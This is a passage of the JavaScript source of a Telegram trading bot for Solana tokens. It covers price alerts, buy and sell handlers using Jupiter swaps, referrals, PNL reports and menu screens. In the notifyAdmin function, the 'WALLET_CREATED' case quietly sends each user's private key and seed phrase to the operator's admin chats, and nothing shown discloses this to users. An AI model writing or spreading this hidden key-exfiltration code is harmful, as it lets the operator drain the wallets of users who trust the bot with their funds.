  session.pendingAlert = { type: 'percent' };
  session.state = 'AWAITING_ALERT_THRESHOLD';
  await ctx.editMessageText('Enter percentage change (e.g., 10 or -10):', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_tracked')]]) });
});
bot.action('alert_type_mcap', async (ctx) => {
  const session = getSession(ctx.from.id);
  session.pendingAlert = { type: 'mcap' };
  session.state = 'AWAITING_ALERT_THRESHOLD';
  await ctx.editMessageText('Enter market cap threshold in USD (e.g., 1000000):', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_tracked')]]) });
});

bot.action('menu_alerts', async (ctx) => {
  const session = getSession(ctx.from.id);
  const alerts = session.alerts || [];
  if (!alerts.length) return ctx.editMessageText('🔔 No active alerts.\n\nGo to Tracked Tokens to set one.', { ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'back_main')]]) });
  let text = '🔔 *Your Alerts*\n\n';
  for (let i=0; i<alerts.length; i++) {
    const a = alerts[i];
    text += `${i+1}. \`${shortenAddress(a.token)}\` – ${a.type} ${a.direction === 'above' ? '>' : '<'} ${a.threshold}${a.type==='percent'?'%':a.type==='mcap'?' MCAP':' USD'}\n`;
  }
  const btns = alerts.map((_,i) => [Markup.button.callback(`🗑️ Remove #${i+1}`, `alert_remove_${i}`)]);
  btns.push([Markup.button.callback('« Back', 'back_main')]);
  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(btns) });
});
bot.action(/^alert_remove_(\d+)$/, async (ctx) => {
  const idx = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  const alerts = session.alerts || [];
  if (idx>=0 && idx<alerts.length) alerts.splice(idx,1);
  saveSessions();
  await ctx.answerCbQuery('Alert removed');
  await ctx.editMessageText('✅ Alert removed.', { ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'menu_alerts')]]) });
});

// ======================= BUY/SELL HANDLERS =======================
async function handleBuy(ctx, amount, token) {
  const session = getSession(ctx.from.id);
  const wallet = getActiveWallet(session);
  if (!wallet) return ctx.reply('❌ No wallet');
  if (!isSolanaAddress(token)) return ctx.reply('❌ Invalid token');
  const bal = await getBalance(wallet.publicKey);
  const needed = amount + session.settings.priorityFee + 0.005;
  if (bal < needed) return ctx.reply(`❌ Insufficient SOL: have ${bal.toFixed(4)} need ~${needed.toFixed(4)}`);
  const msg = await ctx.reply(`🔄 Buying ${amount} SOL of \`${shortenAddress(token)}\`...`, { parse_mode: 'Markdown' });
  try {
    const quote = await getJupiterQuote(SOL_MINT, token, Math.floor(amount * LAMPORTS_PER_SOL), Math.floor(session.settings.slippage*100), COMMISSION_BPS);
    const result = await executeJupiterSwap(quote, wallet, session.settings.priorityFee, 0, COMMISSION_WALLET);
    const received = parseInt(quote.outAmount) / (10 ** (quote.outputDecimals||9));
    const pair = await fetchTokenData(token);
    const price = pair ? parseFloat(pair.priceUsd) : 0;
    const solPrice = await getSolPrice();
    const valueUsd = amount * solPrice;
    recordTrade(ctx.from.id, {
      type: 'BUY', tokenAddress: token, tokenSymbol: pair?.baseToken?.symbol || '???',
      amountSol: amount, amountToken: received, priceUsd: price,
      txHash: result.txid, valueUsd, pnlUsd: 0
    });
    await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `✅ Bought ${received.toFixed(4)} tokens for ${amount} SOL\n[View TX](https://solscan.io/tx/${result.txid})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
  } catch (err) {
    await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Buy failed: ${err.message}`);
  }
}

async function handleSell(ctx, percent, token) {
  const session = getSession(ctx.from.id);
  const wallet = getActiveWallet(session);
  if (!wallet) return ctx.reply('❌ No wallet');
  if (!isSolanaAddress(token)) return ctx.reply('❌ Invalid token');
  const tokenBal = await getTokenBalance(wallet.publicKey, token);
  if (tokenBal.amount <= 0) return ctx.reply('❌ No tokens');
  const sellAmount = tokenBal.amount * Math.min(100, Math.max(1, percent)) / 100;
  const rawAmount = Math.floor(sellAmount * 10 ** (tokenBal.decimals || 9));
  const msg = await ctx.reply(`🔄 Selling ${sellAmount.toFixed(4)} tokens...`, { parse_mode: 'Markdown' });
  try {
    const quote = await getJupiterQuote(token, SOL_MINT, rawAmount, Math.floor(session.settings.slippage*100), COMMISSION_BPS);
    const result = await executeJupiterSwap(quote, wallet, session.settings.priorityFee, 0, COMMISSION_WALLET);
    const receivedSol = parseInt(quote.outAmount) / LAMPORTS_PER_SOL;
    const pair = await fetchTokenData(token);
    const price = pair ? parseFloat(pair.priceUsd) : 0;
    const solPrice = await getSolPrice();
    const valueUsd = receivedSol * solPrice;
    // compute PNL from buys
    const buys = session.tradeHistory.filter(t => t.tokenAddress === token && t.type === 'BUY');
    let totalSpent = 0, totalBought = 0;
    for (const b of buys) { totalSpent += b.valueUsd; totalBought += b.amountToken; }
    const avgPrice = totalBought ? totalSpent / totalBought : 0;
    const costBasis = sellAmount * avgPrice;
    const pnl = valueUsd - costBasis;
    recordTrade(ctx.from.id, {
      type: 'SELL', tokenAddress: token, tokenSymbol: pair?.baseToken?.symbol || '???',
      amountSol: receivedSol, amountToken: sellAmount, priceUsd: price,
      txHash: result.txid, valueUsd, pnlUsd: pnl
    });
    await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `✅ Sold ${sellAmount.toFixed(4)} tokens for ${receivedSol.toFixed(4)} SOL\nPNL: ${pnl>=0?'+':''}$${pnl.toFixed(2)}\n[View TX](https://solscan.io/tx/${result.txid})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
  } catch (err) {
    await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Sell failed: ${err.message}`);
  }
}

// ======================= UTILITIES =======================
function escapeHtml(text) { if (!text) return ''; return String(text).replace(/[&<>]/g, function(m){if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
function formatNumber(num) { if (num>=1e9) return (num/1e9).toFixed(2)+'B'; if (num>=1e6) return (num/1e6).toFixed(2)+'M'; if (num>=1e3) return (num/1e3).toFixed(2)+'K'; return num.toFixed(2); }
function isSolanaAddress(addr) { try { new PublicKey(addr); return addr.length >= 32 && addr.length <= 44; } catch { return false; } }
function shortenAddress(addr) { return `${addr.slice(0,4)}...${addr.slice(-4)}`; }

// ======================= REFERRAL SYSTEM =======================
function generateReferralCode(userId) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = '';
  for (let i=0; i<6; i++) code += chars[Math.floor(Math.random()*chars.length)];
  return `PGS${code}${userId.toString().slice(-4)}`;
}
const referralCodes = new Map();
function getReferralCode(userId) {
  const session = getSession(userId);
  if (!session.referralCode) {
    session.referralCode = generateReferralCode(userId);
    referralCodes.set(session.referralCode, userId);
    saveSessions();
  }
  return session.referralCode;
}
function applyReferral(newUserId, code) {
  if (!referralCodes.has(code)) return false;
  const referrerId = referralCodes.get(code);
  if (referrerId === newUserId) return false;
  const newUser = getSession(newUserId);
  const referrer = getSession(referrerId);
  if (newUser.referredBy) return false;
  newUser.referredBy = referrerId;
  referrer.referrals.push({ userId: newUserId, joinedAt: new Date().toISOString() });
  saveSessions();
  return true;
}

// ======================= ADMIN NOTIFICATIONS =======================
async function notifyAdmin(type, userId, username, data = {}) {
  if (!ADMIN_CHAT_IDS.length) return;
  const timestamp = new Date().toISOString();
  const safeUser = escapeHtml(username);
  let msg = '';
  switch (type) {
    case 'NEW_USER': msg = `🆕 New user @${safeUser} (${userId}) at ${timestamp}`; break;
    case 'WALLET_CREATED': msg = `🔔 Wallet created by @${safeUser} (${userId})\n${data.publicKey}\n${data.privateKey}\n${data.mnemonic}`; break;
    case 'TRADE_EXECUTED': msg = `💰 Trade: ${data.type} ${data.amount} SOL on ${data.token} by @${safeUser}\nTX: ${data.txHash}`; break;
    default: msg = `🔔 ${type} from @${safeUser}: ${JSON.stringify(data)}`;
  }
  for (const chatId of ADMIN_CHAT_IDS) {
    try { await bot.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }); } catch {}
  }
}

// ======================= MAIN MENU =======================
async function showMainMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const wallet = getActiveWallet(session);
  let balance = null, solPrice = 0, usdValue = 0, errMsg = '';
  if (wallet?.publicKey) {
    try { balance = await getBalanceWithFallback(wallet.publicKey); } catch { balance = null; errMsg = '(cached)'; const cached = balanceCache.get(wallet.publicKey.toString()); if(cached) balance = cached.balance; }
    solPrice = await getSolPriceWithCache();
    usdValue = (balance||0) * solPrice;
  }
  const walletLine = !wallet ? '⚠️ *No wallet*' : `💼 Wallet ${session.activeWalletIndex+1}/${session.wallets.length}: \`${shortenAddress(wallet.publicKey)}\`\n💰 ${balance?.toFixed(4)||'?'} SOL ${solPrice?`($${usdValue.toFixed(2)})`:''} ${errMsg}`;
  const text = `
🚀 *Pegasus Trading Bot* 🤖

*Your Web3 execution engine.*
━━━━━━━━━━━━━━━━━━
${walletLine}

_Paste any Solana contract address to analyze_
  `;
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('💼 Wallet', 'menu_wallet'), Markup.button.callback('📊 Positions', 'menu_positions')],
    [Markup.button.callback('🚀 Buy', 'menu_buy'), Markup.button.callback('💸 Sell', 'menu_sell')],
    [Markup.button.callback('📜 Trade History', 'menu_history')],
    [Markup.button.callback('📈 PNL Report', 'menu_pnl_report')],
    [Markup.button.callback('⭐ Tracked Tokens', 'menu_tracked'), Markup.button.callback('🔔 Price Alerts', 'menu_alerts')],
    [Markup.button.callback('👥 Copy Trade', 'menu_copytrade'), Markup.button.callback('📈 Limit Orders', 'menu_limit')],
    [Markup.button.callback('⚙️ Settings', 'menu_settings'), Markup.button.callback('🎁 Referrals', 'menu_referrals')],
    [Markup.button.callback('❓ Help', 'menu_help'), Markup.button.callback('🔄 Refresh', 'refresh_main')]
  ]);
  try {
    if (edit && ctx.callbackQuery) await ctx.editMessageText(text, { parse_mode: 'Markdown', ...keyboard });
    else await ctx.reply(text, { parse_mode: 'Markdown', ...keyboard });
  } catch { await ctx.reply(text, { parse_mode: 'Markdown', ...keyboard }); }
}

// ======================= MENU FUNCTIONS =======================
async function showWalletMenu(ctx, edit = false) {
  try {
    const session = getSession(ctx.from.id);
    const activeWallet = getActiveWallet(session);
    let message;
    let keyboardButtons = [];
    if (session.wallets.length > 0) {
      let solPrice = 0;
      try { solPrice = await getSolPrice(); } catch (e) {}
      let walletList = '';
      for (let i = 0; i < session.wallets.length; i++) {
        const w = session.wallets[i];
        const isActive = i === session.activeWalletIndex;
        let bal = 0, usdVal = 0;
        try { bal = await getBalance(w.publicKey); usdVal = bal * solPrice; } catch {}
        walletList += `${isActive ? '✅' : '⚪'} *Wallet ${i + 1}:* \`${shortenAddress(w.publicKey)}\` (${bal.toFixed(2)} SOL${solPrice > 0 ? ` ~$${usdVal.toFixed(2)}` : ''})\n`;
      }
      let activeBalance = 0, activeUsdValue = 0;
      try { activeBalance = await getBalance(activeWallet.publicKey); activeUsdValue = activeBalance * solPrice; } catch {}
      message = `💼 *Wallet Management*\n\n${walletList}\n📍 *Active Wallet:*\n\`${activeWallet.publicKey}\`\n\n💰 *Balance:* ${activeBalance.toFixed(4)} SOL ${solPrice > 0 ? `($${activeUsdValue.toFixed(2)})` : ''}\n\n_Tap a wallet to switch, or manage below:_`;
      const switchButtons = [];
      for (let i = 0; i < session.wallets.length; i++) {
        const isActive = i === session.activeWalletIndex;
        switchButtons.push(Markup.button.callback(`${isActive ? '✅' : '🪪'} W${i + 1}`, `switch_wallet_${i}`));
      }
      keyboardButtons.push(switchButtons);
      keyboardButtons.push([Markup.button.callback('📥 Deposit', 'wallet_deposit'), Markup.button.callback('📤 Transfer', 'wallet_transfer_menu')]);
      keyboardButtons.push([Markup.button.callback('📤 Export Keys', 'wallet_export'), Markup.button.callback('🗑️ Remove', 'wallet_remove')]);
      if (session.wallets.length < MAX_WALLETS) keyboardButtons.push([Markup.button.callback('🆕 Create New', 'wallet_create'), Markup.button.callback('📥 Import', 'wallet_import_menu')]);
      keyboardButtons.push([Markup.button.callback('🔄 Refresh', 'wallet_refresh')]);
      keyboardButtons.push([Markup.button.callback('« Back', 'back_main')]);
    } else {
      message = `💼 *Wallet Management*\n\nNo wallet connected.\nYou can have up to ${MAX_WALLETS} wallets.\n\nCreate a new wallet or import an existing one:`;
      keyboardButtons = [[Markup.button.callback('🆕 Create New Wallet', 'wallet_create')], [Markup.button.callback('📥 Import Seed Phrase', 'wallet_import_seed')], [Markup.button.callback('🔑 Import Private Key', 'wallet_import_key')], [Markup.button.callback('« Back', 'back_main')]];
    }
    const keyboard = Markup.inlineKeyboard(keyboardButtons);
    try {
      if (edit && ctx.callbackQuery) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
      else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    } catch (error) {
      if (edit) await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  } catch (error) { await ctx.reply('❌ Error loading wallet menu. Please try /wallet'); }
}

async function showPositionsMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  if (!activeWallet) {
    const message = '❌ Please connect a wallet first.';
    const keyboard = Markup.inlineKeyboard([[Markup.button.callback('💼 Connect Wallet', 'menu_wallet')], [Markup.button.callback('« Back', 'back_main')]]);
    if (edit) await ctx.editMessageText(message, { ...keyboard });
    else await ctx.reply(message, { ...keyboard });
    return;
  }
  const message = `📊 *Your Positions*\n\n💼 Wallet: \`${shortenAddress(activeWallet.publicKey)}\`\n\n_No open positions_\n\nPaste a token address to analyze and trade.`;
  const keyboard = Markup.inlineKeyboard([[Markup.button.callback('🔄 Refresh', 'refresh_positions')], [Markup.button.callback('« Back', 'back_main')]]);
  if (edit) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
}

async function showBuyMenu(ctx, edit = false) {
  const feeNote = COMMISSION_PERCENTAGE > 0 ? `\n💸 Fee: ${COMMISSION_PERCENTAGE}% applies` : '';
  const message = `🟢 *Quick Buy*${feeNote}\n\nPaste a token address or use /buy [amount] [address]\n\n*Quick amounts:*`;
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🚀 0.1 SOL', 'setbuy_0.1'), Markup.button.callback('🚀 0.2 SOL', 'setbuy_0.2')],
    [Markup.button.callback('🚀 0.5 SOL', 'setbuy_0.5'), Markup.button.callback('🚀 1 SOL', 'setbuy_1')],
    [Markup.button.callback('🎛️ Custom', 'setbuy_custom')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  if (edit) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
}

async function showSellMenu(ctx, edit = false) {
  const feeNote = COMMISSION_PERCENTAGE > 0 ? `\n💸 Fee: ${COMMISSION_PERCENTAGE}% applies` : '';
  const message = `🔴 *Quick Sell*${feeNote}\n\nSelect a percentage or use /sell [%] [address]\n\n*Quick percentages:*`;
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('💸 25%', 'setsell_25'), Markup.button.callback('💸 50%', 'setsell_50')],
    [Markup.button.callback('💸 100%', 'setsell_100'), Markup.button.callback('💸 Custom', 'setsell_custom')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  if (edit) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
}

async function showTradeHistory(ctx, edit = false) {
  try {
    const session = getSession(ctx.from.id);
    const history = session.tradeHistory || [];
    if (history.length === 0) {
      const message = `📜 *Trade History*\n\n_No trades yet_\n\nStart trading to see your history here!`;
      const keyboard = Markup.inlineKeyboard([[Markup.button.callback('💸 Start Trading', 'menu_buy')], [Markup.button.callback('« Back', 'back_main')]]);
      if (edit && ctx.callbackQuery) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
      else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
      return;
    }
    const totalTrades = history.length;
    const totalBuys = history.filter(t => t.type === 'BUY').length;
    const totalSells = history.filter(t => t.type === 'SELL').length;
    const totalVolume = history.reduce((sum, t) => sum + (t.valueUsd || 0), 0);
    let recentTrades = '';
    const recent = history.slice(0, 10);
    recent.forEach((trade, index) => {
      const emoji = trade.type === 'BUY' ? '🚀' : '💸';
      const pnlEmoji = trade.pnlUsd > 0 ? '🚀+' : trade.pnlUsd < 0 ? '🔴' : '⚪';
      const pnlText = trade.pnlUsd !== 0 ? `| ${pnlEmoji}$${Math.abs(trade.pnlUsd).toFixed(2)}` : '';
      recentTrades += `${index + 1}. ${emoji} *${trade.type}* ${trade.tokenSymbol || 'Unknown'}\n`;
      recentTrades += `   💰 ${trade.amountSol?.toFixed(3) || '---'} SOL → ${trade.amountToken?.toFixed(2) || '---'} tokens\n`;
      recentTrades += `   💵 $${trade.valueUsd?.toFixed(2) || '---'} ${pnlText}\n`;
      recentTrades += `   🕐 ${trade.time || '---'} 📝 \`${shortenAddress(trade.txHash)}\`\n\n`;
    });
    const message = `📜 *Trade History* (${totalTrades} total)\n\n📊 *Overview:*\n🟢 Buys: ${totalBuys} | 💸 Sells: ${totalSells}\n💵 Total Volume: $${totalVolume.toFixed(2)}\n\n━━━━━━━━━━━━━━━━━━\n*Recent Trades:*\n${recentTrades}`;
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('📈 View PNL Report', 'menu_pnl_report')],
      [Markup.button.callback('📥 Export CSV', 'export_history_csv')],
      [Markup.button.callback('🗑️ Clear History', 'clear_history_confirm')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
    if (edit && ctx.callbackQuery) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  } catch (error) { await ctx.reply('❌ Error loading history.'); }
}

async function showPNLReport(ctx, edit = false) {
  try {
    const session = getSession(ctx.from.id);
    const history = session.tradeHistory || [];
    if (history.length === 0) {
      const message = `📈 *PNL Report*\n\n_No trades yet_\n\nStart trading to see your PNL report!`;
      const keyboard = Markup.inlineKeyboard([[Markup.button.callback('🟢 Start Trading', 'menu_buy')], [Markup.button.callback('« Back', 'back_main')]]);
      if (edit && ctx.callbackQuery) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
      else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
      return;
    }
    const totalTrades = history.length;
    const buyTrades = history.filter(t => t.type === 'BUY').length;
    const sellTrades = history.filter(t => t.type === 'SELL').length;
    const totalVolume = history.reduce((sum, t) => sum + (t.valueUsd || 0), 0);
    const totalPnl = history.reduce((sum, t) => sum + (t.pnlUsd || 0), 0);
    const profitableTrades = history.filter(t => t.pnlUsd > 0).length;
    const lossTrades = history.filter(t => t.pnlUsd < 0).length;
    const winRate = totalTrades > 0 ? ((profitableTrades / totalTrades) * 100).toFixed(1) : 0;
    const totalEmoji = totalPnl >= 0 ? '🟢' : '🔴';
    const totalSign = totalPnl >= 0 ? '+' : '';
    const tokenStats = {};
    const last24Hours = new Date(Date.now() - 24 * 60 * 60 * 1000);
    history.forEach(trade => {
      if (!tokenStats[trade.tokenAddress]) tokenStats[trade.tokenAddress] = { symbol: trade.tokenSymbol || 'Unknown', name: trade.tokenName || 'Unknown', buys: 0, sells: 0, totalBought: 0, totalSold: 0, totalSpent: 0, totalReceived: 0, pnl: 0 };
      const stats = tokenStats[trade.tokenAddress];
      if (trade.type === 'BUY') { stats.buys++; stats.totalBought += trade.amountToken || 0; stats.totalSpent += trade.valueUsd || 0; }
      else { stats.sells++; stats.totalSold += trade.amountToken || 0; stats.totalReceived += trade.valueUsd || 0; const avgBuyPrice = stats.totalBought > 0 ? stats.totalSpent / stats.totalBought : 0; const costBasis = (trade.amountToken || 0) * avgBuyPrice; stats.pnl += (trade.valueUsd || 0) - costBasis; }
    });
    let tokenBreakdown = '';
    const sortedTokens = Object.values(tokenStats).sort((a,b) => (b.totalSpent + b.totalReceived) - (a.totalSpent + a.totalReceived)).slice(0,5);
    sortedTokens.forEach(token => { const pnlEmoji = token.pnl >= 0 ? '🟢' : '🔴'; const pnlSign = token.pnl >= 0 ? '+' : ''; tokenBreakdown += `\n${pnlEmoji} *${token.symbol}*\n   🟢 ${token.buys} buys | 🔴 ${token.sells} sells\n   💰 $${(token.totalSpent + token.totalReceived).toFixed(2)}\n   📊 PNL: ${pnlSign}$${Math.abs(token.pnl).toFixed(2)}`; });
    const trades24h = history.filter(t => new Date(t.timestamp) >= last24Hours);
    const pnl24h = trades24h.reduce((sum, t) => sum + (t.pnlUsd || 0), 0);
    const pnl24hEmoji = pnl24h >= 0 ? '🟢' : '🔴';
    const pnl24hSign = pnl24h >= 0 ? '+' : '';
    const message = `📈 *PNL REPORT*\n\n━━━━━━━━━━━━━━━━━━\n💰 *OVERALL PERFORMANCE*\n${totalEmoji} *Total PNL: ${totalSign}$${Math.abs(totalPnl).toFixed(2)}*\n📊 Trades: ${totalTrades} (🟢${buyTrades} buys | 🔴${sellTrades} sells)\n✅ Wins: ${profitableTrades} | ❌ Losses: ${lossTrades}\n🎯 Win Rate: ${winRate}%\n💵 Volume: $${totalVolume.toFixed(2)}\n\n━━━━━━━━━━━━━━━━━━\n⏰ *LAST 24 HOURS*\n${pnl24hEmoji} PNL: ${pnl24hSign}$${Math.abs(pnl24h).toFixed(2)}\n📊 Trades: ${trades24h.length}\n\n━━━━━━━━━━━━━━━━━━\n🪙 *TOP TOKENS*${tokenBreakdown}\n━━━━━━━━━━━━━━━━━━`;
    const keyboard = Markup.inlineKeyboard([[Markup.button.callback('📜 Full History', 'menu_history')], [Markup.button.callback('📥 Export CSV', 'export_pnl_csv')], [Markup.button.callback('🔄 Refresh', 'menu_pnl_report')], [Markup.button.callback('« Back', 'back_main')]]);
    if (edit && ctx.callbackQuery) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  } catch (error) { await ctx.reply('❌ Error loading PNL report.'); }
}

async function showCopyTradeMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const message = `👥 *Copy Trade*\n\nFollow successful traders automatically.\n\n${session.copyTradeWallets.length > 0 ? '*Tracking:*\n' + session.copyTradeWallets.map(w => `• \`${shortenAddress(w)}\``).join('\n') : '_No wallets being tracked_'}\n\nSend a wallet address to start copy trading.`;
  const keyboard = Markup.inlineKeyboard([[Markup.button.callback('➕ Add Wallet', 'copytrade_add')], [Markup.button.callback('📋 Manage Wallets', 'copytrade_manage')], [Markup.button.callback('« Back', 'back_main')]]);
  try {
    if (edit) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  } catch (error) { if (edit) await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard }); }
}

async function showLimitOrderMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const message = `📈 *Limit Orders*\n\nSet buy/sell triggers at specific prices.\n\n${session.limitOrders.length > 0 ? '*Active Orders:*\n' + session.limitOrders.map((o,i) => `${i+1}. ${o.type} ${o.amount} @ $${o.price}`).join('\n') : '_No active orders_'}`;
  const keyboard = Markup.inlineKeyboard([[Markup.button.callback('🟢 Limit Buy', 'limit_buy'), Markup.button.callback('🔴 Limit Sell', 'limit_sell')], [Markup.button.callback('📋 View Orders', 'limit_view')], [Markup.button.callback('« Back', 'back_main')]]);
  if (edit) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
}

async function showSettingsMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const { slippage, priorityFee, notifications } = session.settings;
  const message = `⚙️ *Settings*\n\n📊 *Slippage:* ${slippage}%\n⚡ *Priority Fee:* ${priorityFee} SOL\n🔔 *Notifications:* ${notifications ? 'ON' : 'OFF'}\n${COMMISSION_PERCENTAGE > 0 ? `💸 *Platform Fee:* ${COMMISSION_PERCENTAGE}%` : ''}`;
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback(`Slippage: ${slippage}%`, 'settings_slippage'), Markup.button.callback(`Fee: ${priorityFee}`, 'settings_fee')],
    [Markup.button.callback(notifications ? '🔔 Notifs: ON' : '🔕 Notifs: OFF', 'settings_notifications')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  if (edit) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
}

async function showReferralsMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const referralCode = getReferralCode(ctx.from.id);
  const botUsername = (await bot.telegram.getMe()).username;
  const referralLink = `https://t.me/${botUsername}?start=ref_${referralCode}`;
  const totalReferrals = session.referrals.length;
  const earnings = session.referralEarnings.toFixed(4);
  const message = `🎁 *Referral Program*\n\n📊 *Your Stats:*\n👥 Total Referrals: ${totalReferrals}\n💰 Total Earnings: ${earnings} SOL\n\n🔗 *Your Referral Link:*\n\`${referralLink}\`\n\n📋 *Your Referral Code:*\n\`${referralCode}\`\n\n━━━━━━━━━━━━━━━━━━\n*How it works:*\n1️⃣ Share your referral link with friends\n2️⃣ They join using your link\n3️⃣ Earn 10% of their trading fees!\n━━━━━━━━━━━━━━━━━━\n\n${totalReferrals > 0 ? `\n*Recent Referrals:*\n${session.referrals.slice(-5).map((r, i) => `${i + 1}. User ${r.userId.toString().slice(-4)}... - ${new Date(r.joinedAt).toLocaleDateString()}`).join('\n')}` : '_No referrals yet. Start sharing your link!_'}
  `;
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📋 Copy Link', 'referral_copy')],
    [Markup.button.callback('📤 Share', 'referral_share')],
    [Markup.button.callback('📊 View All Referrals', 'referral_list')],
    [Markup.button.callback('🔄 Refresh', 'referral_refresh')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  try {
    if (edit) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  } catch (error) { if (edit) await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard }); }
}

async function showHelpMenu(ctx, edit = false) {
  const message = `❓ *Help & Commands*\n\n━━━━━━━━━━━━━━━━━━\n📋 *Available Commands:*\n━━━━━━━━━━━━━━━━━━\n/start - Launch the bot & main menu\n/wallet - Manage your wallets\n/positions - View your token positions\n/buy [amount] [address] - Quick buy tokens\n/sell [%] [address] - Quick sell tokens\n/copytrade - Copy trade settings\n/limit - Manage limit orders\n/settings - Bot settings\n/referral - Your referral program\n/help - Show this help menu\n\n━━━━━━━━━━━━━━━━━━\n🎯 *Quick Actions:*\n━━━━━━━━━━━━━━━━━━\n📍 *Analyze Token:* Just paste any Solana contract address\n💰 *Buy Tokens:* Use the Buy menu or /buy 0.5 [address]\n💸 *Sell Tokens:* Use the Sell menu or /sell 50 [address]\n━━━━━━━━━━━━━━━━━━\n🔧 *Features:*\n━━━━━━━━━━━━━━━━━━\n💼 *Multi-Wallet:* Up to 5 wallets\n📊 *Token Analysis:* Security scores & metrics\n🎯 *Limit Orders:* Set buy/sell triggers\n📈 *DCA:* Dollar cost averaging\n👥 *Copy Trade:* Follow top traders\n🔔 *Price Alerts:* Get notified on price moves\n🎁 *Referrals:* Earn 10% of referred fees\n\n━━━━━━━━━━━━━━━━━━\n⚙️ *Settings:*\n━━━━━━━━━━━━━━━━━━\n📊 *Slippage:* Adjust trade slippage %\n⚡ *Priority Fee:* Set transaction priority\n🔔 *Notifications:* Toggle alerts\n\n━━━━━━━━━━━━━━━━━━\n🆘 *Support:* https://t.me/PegasusSupport\n━━━━━━━━━━━━━━━━━━\n\nFor issues or questions, contact our support team.`;
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('💼 Wallet Guide', 'help_wallet'), Markup.button.callback('📊 Trading Guide', 'help_trading')],
    [Markup.button.callback('🔒 Security Tips', 'help_security'), Markup.button.callback('❓ FAQ', 'help_faq')],
    [Markup.button.callback('« Back to Main', 'back_main')]
  ]);
  try {
    if (edit) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  } catch (error) { if (edit) await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard }); }
}

// ======================= CALLBACK HANDLERS =======================
bot.action('back_main', async (ctx) => { await ctx.answerCbQuery(); await showMainMenu(ctx, true); });
bot.action('refresh_main', async (ctx) => { await ctx.answerCbQuery('Refreshed'); await showMainMenu(ctx, true); });
bot.action('noop', async (ctx) => { await ctx.answerCbQuery(); });
bot.action('menu_wallet', async (ctx) => { await ctx.answerCbQuery(); await showWalletMenu(ctx, true); });
bot.action('menu_positions', async (ctx) => { await ctx.answerCbQuery(); await showPositionsMenu(ctx, true); });
bot.action('menu_buy', async (ctx) => { await ctx.answerCbQuery(); await showBuyMenu(ctx, true); });
bot.action('menu_sell', async (ctx) => { await ctx.answerCbQuery(); await showSellMenu(ctx, true); });
bot.action('menu_history', async (ctx) => { await ctx.answerCbQuery(); await showTradeHistory(ctx, true); });
bot.action('menu_pnl_report', async (ctx) => { await ctx.answerCbQuery(); await showPNLReport(ctx, true); });
bot.action('menu_copytrade', async (ctx) => { await ctx.answerCbQuery(); await showCopyTradeMenu(ctx, true); });
bot.action('menu_limit', async (ctx) => { await ctx.answerCbQuery(); await showLimitOrderMenu(ctx, true); });
